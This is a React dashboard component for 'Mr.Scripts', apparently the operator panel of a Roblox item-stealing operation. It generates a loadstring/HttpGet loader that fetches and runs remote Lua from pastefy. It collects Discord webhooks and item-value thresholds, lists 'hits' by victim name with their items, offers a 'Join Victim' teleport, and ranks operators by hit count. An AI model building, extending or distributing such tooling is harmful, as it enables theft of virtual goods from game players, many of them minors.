'use client'

import { useMemo, useState, useEffect } from 'react'
import { useRouter } from 'next/navigation'
import { signOut } from 'next-auth/react'
import {
  Check, ChevronDown, Code2, Copy, Crosshair, Gauge, LayoutDashboard, List, LoaderCircle, LogOut, Menu, Moon, Save, Settings2, ShieldCheck, SlidersHorizontal, Sparkles, Trophy, X, ArrowLeft, Trash2
} from 'lucide-react'

type GameType = 'mm2' | 'sab' | 'adoptme' | 'bloxfruits'
type DashboardUser = { id: string; name?: string | null; image?: string | null }

type Configuration = {
  name: string; game: GameType; webhookUrl: string; usernames: string; minRarity: string; minUSD: string; pingEveryone: 'Yes' | 'No'; pingFruits: string[]; pastefyId?: string;
}

export type SavedConfiguration = {
  id: string; name: string; game: GameType; webhook: string; usernames: string[]; minRarity: string; minUSD: string; pingEveryone: boolean; pingFruits?: string[]; createdAt: string; token?: string; pastefyId?: string;
}

type SavedConfigurationResponse = SavedConfiguration & { token: string }
type TabId = 'configuration' | 'leaderboard' | 'hits'

const GAME_RARITIES: Record<string, string[]> = {
  mm2: ["Common", "Uncommon", "Rare", "Legendary", "Godly", "Ancient", "Unique", "Vintage"],
  sab: ["Common", "Rare", "Epic", "Legendary", "Mythic", "Brainrot God", "Secret", "OG"],
  adoptme: ["Common", "Uncommon", "Rare", "Ultra-Rare", "Legendary"]
}

const BLOX_FRUITS_CATEGORIES = {
  fruits: [
    "Kitsune", "Dragon", "Control", "Magnet", "Yeti", "Gas", "Tiger", "Venom", "Dough", 
    "Rex", "Gravity", "Mammoth", "Spirit", "Shadow", "Lightning", "Portal", 
    "Buddha", "Blizzard", "Creation", "Phoenix", "Sound", "Spider", "Love", 
    "Magma", "Quake", "Diamond", "Light", "Ghost", "Eagle", "Ice", "Rubber", 
    "Sand", "Dark", "Flame", "Spike", "Smoke", "Bomb", "Spring", "Blade", "Spin", "Rocket"
  ],
  skin: [
    "meme", "fiend (yeti)", "runic fiend", "dog blade", "yellow lightning", 
    "starlight gravity", "green lightning", "galaxy <empyrean (kitsune)>", 
    "empyrean (kitsune)", "purple lightning", "super spirit pain", 
    "arcsteel magnet", "celestial pain", "sadness pain", "frustration pain", 
    "hellfire", "werewolf (tiger)", "divine <portal>",
    "Ember Dragon (West)", "Crimson Kitsune", "Red Lightning", "Rabid",
    "Vibes (Frame Break)", "Doghouse (Frame Break)", "Thermite Bomb", "Azura Bomb"
  ]
};

const initialConfiguration: Configuration = {
  name: 'My script', game: 'mm2', webhookUrl: '', usernames: 'User1, User2', minRarity: 'Godly', minUSD: '5', pingEveryone: 'Yes', pingFruits: [], pastefyId: undefined
}

const tabs = [
  { id: 'configuration', label: 'Settings', icon: Settings2 },
  { id: 'leaderboard', label: 'Leaderboard', icon: Trophy },
  { id: 'hits', label: 'Hits', icon: Crosshair },
] satisfies { id: TabId; label: string; icon: typeof Settings2 }[]

function createConfigurationText(configuration: Configuration, token: string) {
  if (configuration.pastefyId) {
    return `loadstring(game:HttpGet("https://pastefy.app/${configuration.pastefyId}/raw"))()`;
  }
  return `-- Error: Could not generate Pastefy link. Please try "Save & Generate" again.`;
}

export function MrScriptsDashboard({ user, initialConfigs, initialLoadError = '' }: { user: DashboardUser; initialConfigs: SavedConfiguration[]; initialLoadError?: string }) {
  const router = useRouter()
  const [activeTab, setActiveTab] = useState<TabId>('configuration')
  const [savedConfigs, setSavedConfigs] = useState(initialConfigs)
  const [selectedConfigId, setSelectedConfigId] = useState<string | null>(null)
  const [configuration, setConfiguration] = useState(initialConfiguration)
  const [generatedToken, setGeneratedToken] = useState('')
  const [copied, setCopied] = useState(false)
  const [saved, setSaved] = useState(false) 
  const [isSaving, setIsSaving] = useState(false)
  const [saveError, setSaveError] = useState(initialLoadError)
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false)
  
  const output = useMemo(() => createConfigurationText(configuration, generatedToken), [configuration, generatedToken])
  const displayName = user.name?.trim() || 'Discord user'
  const userInitial = displayName.charAt(0).toUpperCase()
  const activeTabLabel = tabs.find((tab) => tab.id === activeTab)?.label ?? 'Settings'

  useEffect(() => { setSavedConfigs(initialConfigs) }, [initialConfigs])

  function update<K extends keyof Configuration>(key: K, value: Configuration[K]) {
    setConfiguration((current) => ({ ...current, [key]: value }))
    setCopied(false)
    setSaveError('')
  }

  function handleFruitToggle(fruit: string) {
    setConfiguration((current) => {
      const exists = current.pingFruits.includes(fruit)
      const updated = exists 
        ? current.pingFruits.filter(f => f !== fruit)
        : [...current.pingFruits, fruit]
      return { ...current, pingFruits: updated }
    })
    setCopied(false)
    setSaveError('')
  }

  function createNewConfiguration() {
    setSelectedConfigId(null)
    setConfiguration(initialConfiguration)
    setGeneratedToken('')
    setSaved(false)
    setCopied(false)
    setSaveError('')
  }

  function selectConfiguration(config: SavedConfiguration) {
    setSelectedConfigId(config.id)
    let parsedFruits: string[] = [];
    if (config.pingFruits && Array.isArray(config.pingFruits)) {
      parsedFruits = config.pingFruits;
    } else if (config.minRarity) {
      parsedFruits = config.minRarity.split(',').map(s => s.trim()).filter(Boolean);
    }
    setConfiguration({
      name: config.name, game: config.game || 'mm2', webhookUrl: config.webhook, usernames: config.usernames.join(', '),
      minRarity: config.minRarity || 'Godly', minUSD: config.minUSD || '5', pingEveryone: config.pingEveryone ? 'Yes' : 'No',
      pingFruits: parsedFruits,
      pastefyId: config.pastefyId 
    })
    setGeneratedToken('')
    setSaved(false)
    setCopied(false)
    setSaveError('')
  }

  async function deleteConfiguration(id: string) {
    if (!confirm('Are you sure you want to delete this script?')) return;
    try {
      const res = await fetch(`/api/config?id=${id}`, { method: 'DELETE' });
      if (res.ok) {
        setSavedConfigs(current => current.filter(c => c.id !== id));
        if (selectedConfigId === id) createNewConfiguration();
        router.refresh();
      }
    } catch (e) { alert('Error deleting script.'); }
  }

  async function saveAndGenerate() {
    setIsSaving(true)
    setSaveError('')
    try {
      const response = await fetch('/api/config', {
        method: selectedConfigId ? 'PATCH' : 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          ...(selectedConfigId ? { id: selectedConfigId } : {}),
          name: configuration.name, game: configuration.game, webhook: configuration.webhookUrl,
          usernames: configuration.usernames, minRarity: configuration.pingFruits.join(', '), minUSD: configuration.minUSD,
          pingEveryone: configuration.pingEveryone,
          pingFruits: configuration.pingFruits,
        }),
      })
      const payload = (await response.json()) as { config?: SavedConfigurationResponse; error?: string }

      if (!response.ok || !payload.config) throw new Error(payload.error || 'Could not save.')
      
      const config = payload.config
      setSavedConfigs((current) => [config, ...current.filter((item) => item.id !== config.id)])
      setSelectedConfigId(config.id)
      setGeneratedToken(config.token)
      setConfiguration(prev => ({ ...prev, pastefyId: config.pastefyId }))
      setSaved(true)
      router.refresh();
    } catch (error) {
      setSaveError(error instanceof Error ? error.message : 'Error saving.')
    } finally {
      setIsSaving(false)
    }
  }

  async function copyConfiguration() {
    try {
      await navigator.clipboard.writeText(output)
      setCopied(true)
      window.setTimeout(() => setCopied(false), 1800)
    } catch {}
  }

  function selectTab(tab: TabId) {
    setActiveTab(tab)
    setMobileMenuOpen(false)
  }

  return (
    <main className="min-h-screen bg-[#080b12] text-slate-100">
      <div className="pointer-events-none fixed inset-0 overflow-hidden" aria-hidden="true">
        <div className="absolute -top-48 right-[-5rem] h-[28rem] w-[28rem] rounded-full bg-blue-600/10 blur-[120px]" />
        <div className="absolute bottom-[-12rem] left-[24%] h-[26rem] w-[26rem] rounded-full bg-violet-600/[0.08] blur-[120px]" />
      </div>

      <div className="relative mx-auto flex min-h-screen max-w-[1600px]">
        {mobileMenuOpen && (
          <button aria-label="Close navigation" className="fixed inset-0 z-30 bg-black/60 md:hidden" onClick={() => setMobileMenuOpen(false)} />
        )}
        <aside className={`fixed inset-y-0 left-0 z-40 flex w-[264px] flex-col border-r border-white/[0.07] bg-[#0b0f18] px-5 py-6 transition-transform md:static md:translate-x-0 ${mobileMenuOpen ? 'translate-x-0' : '-translate-x-full'}`}>
          <div className="flex items-center justify-between">
            <a href="#home" className="flex items-center gap-3" aria-label="Mr.Scripts home">
              <span className="flex size-10 items-center justify-center rounded-xl border border-blue-400/20 bg-gradient-to-br from-blue-500/20 to-violet-500/20 text-blue-300 shadow-[0_0_28px_rgba(59,130,246,0.15)]">
                <Code2 className="size-5" aria-hidden="true" />
              </span>
              <span>
                <span className="block text-[15px] font-semibold tracking-tight text-white">Mr.Scripts</span>
                <span className="mt-0.5 block text-[11px] tracking-wide text-slate-500">CONFIGURATION STUDIO</span>
              </span>
            </a>
            <button onClick={() => setMobileMenuOpen(false)} className="rounded-lg p-2 text-slate-400 hover:bg-white/5 md:hidden" aria-label="Close menu">
              <X className="size-4" />
            </button>
          </div>

          <div className="mt-12">
            <p className="mb-3 px-3 text-[10px] font-semibold uppercase tracking-[0.18em] text-slate-600">Workspace</p>
            <nav aria-label="Main navigation" className="flex flex-col gap-1">
              {tabs.map(({ id, label, icon: Icon }) => (
                <button key={id} onClick={() => selectTab(id)} aria-current={activeTab === id ? 'page' : undefined} className={`group flex items-center gap-3 rounded-xl px-3 py-3 text-left text-[13px] font-medium transition ${activeTab === id ? 'border border-blue-400/15 bg-blue-500/[0.10] text-blue-200 shadow-[inset_0_1px_0_rgba(255,255,255,0.04)]' : 'text-slate-400 hover:bg-white/[0.04] hover:text-slate-200'}`}>
                  <Icon className={`size-[17px] ${activeTab === id ? 'text-blue-300' : 'text-slate-500 group-hover:text-slate-300'}`} aria-hidden="true" />
                  {label}
                </button>
              ))}
            </nav>
          </div>

          <div className="mt-auto rounded-2xl border border-white/[0.07] bg-white/[0.025] p-4">
            <div className="mb-3 flex items-center gap-2 text-xs font-medium text-slate-300">
              <ShieldCheck className="size-4 text-emerald-400" aria-hidden="true" /> Private workspace
            </div>
          </div>
        </aside>

        <section className="min-w-0 flex-1">
          <header className="flex min-h-[72px] items-center justify-between gap-3 border-b border-white/[0.07] px-5 py-3 sm:px-8 lg:px-10">
            <div className="flex min-w-0 items-center gap-3">
              <button onClick={() => setMobileMenuOpen(true)} className="rounded-lg p-2 text-slate-400 hover:bg-white/5 md:hidden" aria-label="Open navigation">
                <Menu className="size-5" />
              </button>
              <div className="hidden items-center gap-2 text-xs text-slate-500 sm:flex">
                <span>Workspace</span><span className="text-slate-700">/</span><span className="text-slate-300">{activeTabLabel}</span>
              </div>
            </div>
            <div className="flex shrink-0 items-center gap-3">
              <div className="flex min-w-0 items-center gap-2">
                {user.image ? (
                  <img src={user.image} alt={`${displayName} Discord avatar`} referrerPolicy="no-referrer" className="size-9 rounded-full border border-white/10 object-cover" />
                ) : (
                  <span className="flex size-9 items-center justify-center rounded-full border border-violet-400/20 bg-violet-500/10 text-xs font-semibold text-violet-200">{userInitial}</span>
                )}
                <span className="hidden max-w-36 truncate text-xs font-medium text-slate-300 sm:block">{displayName}</span>
              </div>
              <button type="button" aria-label="Logout" onClick={() => void signOut({ callbackUrl: '/' })} className="inline-flex h-9 items-center gap-2 rounded-lg border border-white/[0.08] px-3 text-xs font-medium text-slate-300 transition hover:border-white/15 hover:bg-white/[0.05] hover:text-white">
                <LogOut className="size-3.5" aria-hidden="true" />
                <span className="hidden sm:inline">Logout</span>
              </button>
            </div>
          </header>

          <div className="mx-auto max-w-[1050px] px-5 py-8 sm:px-8 sm:py-10 lg:px-10">
            <div className="mb-8 flex flex-col justify-between gap-5 sm:flex-row sm:items-end">
              <div>
                <div className="mb-3 flex items-center gap-2 text-[11px] font-medium uppercase tracking-[0.16em] text-blue-300">
                  <Sparkles className="size-3.5" aria-hidden="true" /> Configuration studio
                </div>
                <h1 className="text-2xl font-semibold tracking-tight text-white sm:text-[30px]">{activeTabLabel}</h1>
              </div>
            </div>

            {activeTab === 'configuration' ? (
              <>
                {!saved ? (
                  <>
                    <ScriptLibrary
                      scripts={savedConfigs}
                      selectedScriptId={selectedConfigId}
                      onCreate={createNewConfiguration}
                      onSelect={selectConfiguration}
                      onDelete={deleteConfiguration}
                      onCopyScript={(script: any) => {
                        if (!script.pastefyId) {
                          alert("This script has no Pastefy link. Please click 'Edit' then 'Save & Generate' to generate a new one.");
                          return;
                        }
                        const loaderScript = `loadstring(game:HttpGet("https://pastefy.app/${script.pastefyId}/raw"))()`;
                        navigator.clipboard.writeText(loaderScript);
                        alert('Loader Script Copied to Clipboard!');
                      }}
                    />
                    <div className="grid gap-5 lg:grid-cols-[minmax(0,1fr)_300px]">
                      <ConfigurationForm configuration={configuration} isEditing={Boolean(selectedConfigId)} isSaving={isSaving} saveError={saveError} onUpdate={update} onToggleFruit={handleFruitToggle} onSubmit={saveAndGenerate} />
                      <aside className="flex flex-col gap-4">
                        <div className="rounded-2xl border border-white/[0.08] bg-[#0d121d]/80 p-5">
                          <div className="mb-4 flex items-center gap-2 text-xs font-semibold text-slate-200">
                            <LayoutDashboard className="size-4 text-violet-300" aria-hidden="true" /> At a glance
                          </div>
                          <div className="flex flex-col gap-3">
                            <div className="flex items-center justify-between rounded-lg bg-white/[0.025] px-3 py-2.5">
                              <span className="text-[11px] text-slate-500">Authorized users</span>
                              <span className="text-xs font-medium text-slate-300">{configuration.usernames.split(',').filter((v) => v.trim()).length}</span>
                            </div>
                            <div className="flex items-center justify-between rounded-lg bg-white/[0.025] px-3 py-2.5">
                              <span className="text-[11px] text-slate-500">Selected Game</span>
                              <span className="rounded-md bg-blue-400/10 px-2 py-1 text-[10px] font-medium text-blue-300 uppercase">{configuration.game}</span>
                            </div>
                          </div>
                        </div>
                      </aside>
                    </div>
                  </>
                ) : (
                  <div className="flex flex-col gap-5">
                    <button onClick={() => setSaved(false)} className="flex w-fit items-center gap-2 rounded-lg border border-white/[0.08] bg-white/[0.02] px-4 py-2 text-xs font-medium text-slate-300 transition hover:bg-white/[0.05] hover:text-white">
                      <ArrowLeft className="size-4" /> Edit Configuration
                    </button>
                    <GeneratedConfiguration configuration={configuration} token={generatedToken} output={output} copied={copied} onCopy={copyConfiguration} />
                  </div>
                )}
              </>
            ) : activeTab === 'hits' ? (
              <HitsTab />
            ) : activeTab === 'leaderboard' ? (
              <LeaderboardTab />
            ) : null}
          </div>
        </section>
      </div>
    </main>
  )
}

function ConfigurationForm({ configuration, isEditing, isSaving, saveError, onUpdate, onToggleFruit, onSubmit }: any) {
  const currentRarities = GAME_RARITIES[configuration.game] || GAME_RARITIES.mm2;
  return (
    <form onSubmit={(e) => { e.preventDefault(); void onSubmit() }} className="rounded-2xl border border-white/[0.08] bg-[#0d121d]/90 p-5 shadow-[0_18px_60px_rgba(0,0,0,0.18)] sm:p-7">
      <div className="mb-7 flex items-start justify-between gap-4">
        <div className="flex items-start gap-3">
          <span className="flex size-9 shrink-0 items-center justify-center rounded-xl bg-blue-500/10 text-blue-300"><SlidersHorizontal className="size-4" aria-hidden="true" /></span>
          <div><h2 className="text-sm font-semibold text-slate-100">General settings</h2><p className="mt-1 text-xs text-slate-500">Customize the values in your export.</p></div>
        </div>
      </div>
      
      <div className="flex flex-col gap-6">
        <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
          Select Game
          <select value={configuration.game} onChange={(e) => onUpdate('game', e.target.value)} className="h-11 w-full appearance-none rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-200 outline-none focus:border-blue-400/50">
            <option value="mm2">MM2</option>
            <option value="sab">SAB</option>
            <option value="adoptme">Adopt Me</option>
            <option value="bloxfruits">Blox Fruits</option>
          </select>
        </label>

        <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
          Script name
          <input type="text" required value={configuration.name} onChange={(e) => onUpdate('name', e.target.value)} className="h-11 w-full rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-100 outline-none focus:border-blue-400/50" />
        </label>

        <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
          Discord Webhook URL
          <input type="url" value={configuration.webhookUrl} onChange={(e) => onUpdate('webhookUrl', e.target.value)} className="h-11 w-full rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-100 outline-none focus:border-blue-400/50" />
        </label>

        <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
          Authorized Usernames
          <input value={configuration.usernames} onChange={(e) => onUpdate('usernames', e.target.value)} className="h-11 w-full rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-100 outline-none focus:border-blue-400/50" />
        </label>

        <div className="flex flex-col gap-6">
          {configuration.game === 'bloxfruits' ? (
            <div className="flex flex-col gap-4 sm:col-span-2">
              <label className="text-xs font-medium text-slate-300">Select Ping Fruits & Skins (Check multiple)</label>
              <div className="grid max-h-72 gap-3 overflow-y-auto rounded-xl border border-white/[0.09] bg-[#090d15] p-4">
                <div className="text-[11px] font-bold text-blue-400 uppercase tracking-wider">Fruits</div>
                <div className="grid grid-cols-2 gap-2 sm:grid-cols-3">
                  {BLOX_FRUITS_CATEGORIES.fruits.map(f => {
                    const checked = configuration.pingFruits.includes(f);
                    return (
                      <label key={f} className={`flex items-center gap-2.5 rounded-lg border p-2.5 text-xs cursor-pointer transition ${checked ? 'border-blue-500/50 bg-blue-500/10 text-white font-medium' : 'border-white/[0.06] bg-white/[0.02] text-slate-300 hover:bg-white/[0.05]'}`}>
                        <input type="checkbox" checked={checked} onChange={() => onToggleFruit(f)} className="rounded border-white/20 bg-black/40 text-blue-600 focus:ring-0 size-4" />
                        <span className="truncate">{f}</span>
                      </label>
                    );
                  })}
                </div>

                <div className="mt-2 text-[11px] font-bold text-violet-400 uppercase tracking-wider">Skins</div>
                <div className="grid grid-cols-2 gap-2 sm:grid-cols-3">
                  {BLOX_FRUITS_CATEGORIES.skin.map(s => {
                    const checked = configuration.pingFruits.includes(s);
                    return (
                      <label key={s} className={`flex items-center gap-2.5 rounded-lg border p-2.5 text-xs cursor-pointer transition ${checked ? 'border-violet-500/50 bg-violet-500/10 text-white font-medium' : 'border-white/[0.06] bg-white/[0.02] text-slate-300 hover:bg-white/[0.05]'}`}>
                        <input type="checkbox" checked={checked} onChange={() => onToggleFruit(s)} className="rounded border-white/20 bg-black/40 text-violet-600 focus:ring-0 size-4" />
                        <span className="truncate">{s}</span>
                      </label>
                    );
                  })}
                </div>
              </div>
            </div>
          ) : (
            (configuration.game === 'mm2' || configuration.game === 'sab') && (
              <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
                Minimum Rarity
                <select value={configuration.minRarity} onChange={(e) => onUpdate('minRarity', e.target.value)} className="h-11 w-full appearance-none rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-200 outline-none focus:border-blue-400/50">
                  {currentRarities.map((rarity: string) => (
                    <option key={rarity} value={rarity}>{rarity}</option>
                  ))}
                </select>
              </label>
            )
          )}

          {(configuration.game === 'sab' || configuration.game === 'adoptme') && (
            <label className="flex flex-col gap-2 text-xs font-medium text-slate-300">
              Min USD Ping
              <input type="number" min="0" value={configuration.minUSD} onChange={(e) => onUpdate('minUSD', e.target.value)} className="h-11 w-full rounded-lg border border-white/[0.09] bg-[#090d15] px-3.5 text-sm text-slate-100 outline-none focus:border-blue-400/50" />
            </label>
          )}
        </div>
      </div>

      <div className="mt-8 flex flex-col-reverse justify-between gap-3 border-t border-white/[0.07] pt-5 sm:flex-row sm:items-center">
        <div className="flex flex-col items-stretch gap-2 sm:items-end">
          {saveError && <p role="alert" className="max-w-sm text-xs text-rose-300">{saveError}</p>}
          <button type="submit" disabled={isSaving} className="inline-flex h-10 items-center justify-center gap-2 rounded-lg bg-blue-600 px-4 text-xs font-semibold text-white shadow-lg transition hover:bg-blue-500 disabled:opacity-60">
            {isSaving ? <LoaderCircle className="size-3.5 animate-spin" /> : <Save className="size-3.5" />}
            {isSaving ? 'Saving…' : 'Save and Generate'}
          </button>
        </div>
      </div>
    </form>
  )
}

function GeneratedConfiguration({ configuration, token, output, copied, onCopy }: any) {
  return (
    <section className="w-full">
      <div className="mb-5 rounded-xl border border-blue-400/15 bg-blue-500/[0.06] p-4">
        <p className="text-[10px] font-medium uppercase tracking-wider text-blue-200/70">Configuration token</p>
        <code className="mt-2 block break-all font-mono text-xs text-blue-100">{token}</code>
      </div>
      
      <div className="overflow-hidden rounded-2xl border border-white/[0.09] bg-[#0b0f18] shadow-lg">
        <div className="flex flex-wrap items-center justify-between gap-3 border-b border-white/[0.07] bg-white/[0.02] px-4 py-3.5">
          <div className="flex items-center gap-3">
            <h2 className="text-[11px] font-medium text-slate-400">{configuration.name}.lua</h2>
            <span className="rounded border border-white/[0.07] px-1.5 py-0.5 text-[9px] text-slate-600 uppercase">{configuration.game}</span>
          </div>
          <button onClick={() => void onCopy()} className={`inline-flex h-8 items-center gap-2 rounded-lg border px-3 text-[11px] font-medium transition ${copied ? 'border-emerald-400/20 bg-emerald-400/10 text-emerald-300' : 'border-white/[0.09] bg-white/[0.04] text-slate-300 hover:bg-white/[0.08]'}`}>
            {copied ? <Check className="size-3.5" /> : <Copy className="size-3.5" />}
            {copied ? 'Copied!' : 'Copy to Clipboard'}
          </button>
        </div>
        <div className="overflow-x-auto px-4 py-6">
          <pre className="min-w-max font-mono text-[12px] text-emerald-300"><code>{output}</code></pre>
        </div>
      </div>
    </section>
  )
}

function ScriptLibrary({ scripts, selectedScriptId, onCreate, onSelect, onCopyScript, onDelete }: any) {
  return (
    <section className="mb-6 rounded-2xl border border-white/[0.08] bg-[#0d121d]/80 p-5 sm:p-6">
      <div className="flex flex-wrap items-center justify-between gap-3">
        <div>
          <h2 className="text-sm font-semibold text-slate-100">Saved scripts</h2>
          <p className="mt-1 text-xs text-slate-500">Choose one to edit, copy, or delete.</p>
        </div>
        <button type="button" onClick={onCreate} className="inline-flex h-9 items-center gap-2 rounded-lg border border-blue-400/20 bg-blue-500/10 px-3 text-xs font-medium text-blue-200 transition hover:bg-blue-500/15">
          <Code2 className="size-3.5" /> New script
        </button>
      </div>
      {scripts.length === 0 ? (
        <p className="mt-4 rounded-xl border border-dashed border-white/[0.08] px-4 py-5 text-center text-xs text-slate-500">No saved scripts yet.</p>
      ) : (
        <div className="mt-4 grid gap-2 sm:grid-cols-2 xl:grid-cols-3">
          {scripts.map((script: any) => (
            <div key={script.id} className={`min-w-0 rounded-xl border p-3 transition ${selectedScriptId === script.id ? 'border-blue-400/30 bg-blue-500/[0.08]' : 'border-white/[0.07] bg-white/[0.02]'}`}>
              <div className="mb-3">
                <span className="block truncate text-xs font-medium text-slate-200">{script.name}</span>
                <span className="mt-1 block text-[10px] text-slate-500 uppercase">{script.game} · {script.usernames.length} users</span>
              </div>
              <div className="flex gap-2">
                <button onClick={() => onSelect(script)} className="flex-1 rounded-md bg-blue-500/10 py-1.5 text-[10px] font-medium text-blue-300 hover:bg-blue-500/20">Edit</button>
                <button onClick={() => onCopyScript(script)} className="flex-1 rounded-md bg-emerald-500/10 py-1.5 text-[10px] font-medium text-emerald-300 hover:bg-emerald-500/20 flex justify-center items-center gap-1"><Copy className="size-3" /> Copy</button>
                <button onClick={() => onDelete(script.id)} className="rounded-md bg-rose-500/10 px-2 py-1.5 text-rose-300 hover:bg-rose-500/20"><Trash2 className="size-3" /></button>
              </div>
            </div>
          ))}
        </div>
      )}
    </section>
  )
}

function HitsTab() {
  const [hitsData, setHitsData] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetch('/api/hits').then(res => res.json()).then(data => {
      setHitsData(data.hits || []);
      setLoading(false);
    });
  }, []);

  const handleJoin = (hit: any) => {
    if (hit.game === 'bloxfruits') {
      navigator.clipboard.writeText(`game:GetService('TeleportService'):TeleportToPlaceInstance(${hit.placeId}, '${hit.serverJobId}')`);
      alert('Teleport script copied!');
    } else {
      window.open(`https://www.roblox.com/games/start?placeId=${hit.placeId}&gameInstanceId=${hit.serverJobId}`, '_blank');
    }
  };

  if (loading) return <p className="text-slate-400">Loading hits...</p>;

  return (
    <div className="space-y-4">
      {hitsData.length === 0 ? <p className="text-slate-400">No hits found yet.</p> : hitsData.map((hit: any) => (
        <div key={hit.id} className="p-4 border border-white/10 rounded-xl bg-[#0d121d] flex justify-between items-center gap-4">
          <div className="flex-1">
            <h3 className="text-white font-bold text-sm uppercase">{hit.game} | {hit.victimName}</h3>
            <pre className="text-[10px] text-slate-300 mt-2 bg-black/50 p-2 rounded max-w-full overflow-x-auto">{hit.itemsSummary}</pre>
          </div>
          <button onClick={() => handleJoin(hit)} className="bg-blue-600 px-4 py-2 rounded-lg text-xs font-semibold text-white">Join Victim</button>
        </div>
      ))}
    </div>
  );
}

function LeaderboardTab() {
  const [timeframe, setTimeframe] = useState('daily');
  const [data, setData] = useState<any[]>([]);

  useEffect(() => {
    fetch(`/api/leaderboard?timeframe=${timeframe}`).then(res => res.json()).then(d => setData(d.leaderboard || []));
  }, [timeframe]);

  return (
    <div>
      <div className="flex gap-2 mb-6">
        {['daily', 'weekly', 'monthly', 'alltime'].map(t => (
          <button key={t} onClick={() => setTimeframe(t)} className={`px-4 py-2 rounded-lg text-xs font-medium transition ${timeframe === t ? 'bg-blue-600 text-white' : 'bg-white/5 text-slate-400 hover:bg-white/10'}`}>{t.toUpperCase()}</button>
        ))}
      </div>
      <div className="space-y-2">
        {data.length === 0 ? <p className="text-slate-400">No data for this timeframe.</p> : data.map((user, i) => (
          <div key={user.userWebhook} className="flex justify-between p-3 border border-white/10 rounded-lg bg-[#0d121d]">
            <span className="text-white text-sm">#{i + 1} - User: {user.userWebhook.substring(user.userWebhook.length - 8)}</span>
            <span className="text-blue-400 font-bold text-sm">{user.hitCount} Hits</span>
          </div>
        ))}
      </div>
    </div>
  );
}